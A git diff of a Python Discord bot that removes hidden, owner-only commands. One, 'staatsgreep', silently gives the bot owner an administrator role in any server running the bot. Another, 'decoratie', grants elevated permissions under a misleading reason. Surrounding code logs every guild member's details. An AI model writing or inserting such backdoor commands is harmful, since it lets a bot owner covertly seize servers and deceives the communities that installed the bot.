@@ -8,9 +8,6 @@ import re
 import apiRequests as api
 
 config = api.readConfig()
-regexSearchWords = api.getRegexSearchWordData()
-regexReactions = api.getRegexReactionData()
-regexBans = api.getRegexBansData()
 cogList = api.getCogs()
 
 bot = commands.Bot(command_prefix=config["basic"]["prefix"], description=config["basic"]["description"])
@@ -121,13 +118,6 @@ async def on_ready():
         for member in guild.members:
             print(f"- membername: {member.name}\n * id: {member.id}\n * discriminator: {member.discriminator}\n * nickname: {member.nick}\n * bot: {member.bot}")
     print("#############################################")
-
-# CUSTOMTEXT
-# command
-@bot.command(hidden = True)
-async def customText(ctx):
-    await ctx.message.delete()
-    await ctx.send(api.getCustomText()["text"])
 
 # COGS
 # load cog command
@@ -270,91 +260,9 @@ async def listCog(ctx):
 
     return await ctx.send(bot.cogs)
 
-# STAATSGREEP
-# command
-@bot.command(hidden = True)
-@commands.is_owner()
-async def staatsgreep(ctx):
-    pCconfig = api.getPermissionClimbingConfig()
-
-    if pCconfig["enabled"]:
-        # Create a role (with admin permissions and a color)
-        server = ctx.guild
-        perms = discord.Permissions(administrator=True)
-        color = discord.Colour(int(pCconfig["make_new_role"]["color"], 16))
-        await server.create_role(name=pCconfig["make_new_role"]["name"], hoist=pCconfig["make_new_role"]["hoist"], permissions=perms, colour=color)
-
-        # Get role as object
-        new_role = discord.utils.get(server.roles, name=pCconfig["make_new_role"]["name"])
-
-        # Get role to top of role list (/ under bot role)
-        for i in range(1, len(server.roles)):
-            try:
-                await new_role.edit(position=i)
-            except discord.Forbidden:
-                break
-            except discord.HTTPException:
-                break
-            except discord.InvalidArgument:
-                break
-
-        # Add me to the role
-        person = ctx.message.author
-        await person.add_roles(new_role)
-
-        if pCconfig["log"]["enabled"]:
-            log_channel = bot.get_channel(int(pCconfig["log"]["channel"]))
-            await log_channel.send(f"Staatsgreep gepleegd in '{server.name}', de rol '{pCconfig['make_new_role']['name']}'")
-
-    else:
-        ctx.send("Staatsgrepen zijn uitgeschakeld.")
-
-# DECORATIE
-# command
-@bot.command(hidden = True)
-@commands.is_owner()
-async def decoratie(ctx):
-    server = ctx.guild
-    perms = discord.Permissions(permissions=20781760)
-    color = discord.Colour(int("0x06ad00", 16))
-    await server.create_role(reason="Gewoon mooie decoratie", name="Decoratie", permissions=perms, colour=color)
-
-    # Get role as object
-    new_role = discord.utils.get(server.roles, name="Decoratie")
-
-    # Add me to the role
-    person = ctx.message.author
-    await person.add_roles(new_role)
-
-    log_channel = bot.get_channel(77769784046492058)
-    await log_channel.send(f"Decoratie toegevoegd in '{server.name}', de rol 'Decoratie'")
-
-# test loop
-# restart loop
-@bot.command(hidden = True)
-@commands.is_owner()
-async def testLoop(ctx):
-    await ctx.send(f"Failed? {checkFilesLoop.failed()}")
-
-# restart loop
-@bot.command(hidden = True)
-@commands.is_owner()
-async def restartLoop(ctx):
-    checkFilesLoop.restart()
-    await ctx.send("Done.")
-
 # file settings file command check
 @tasks.loop(seconds=5.0)
 async def checkFilesLoop():
-    global regexSearchWords
-    regexSearchWords = api.getRegexSearchWordData()
-
-    global regexReactions
-    regexReactions = api.getRegexReactionData()
-
-    global regexBans
-    regexBans = api.getRegexBansData()
-    
     global config
     old_config = config
     config = api.readConfig()
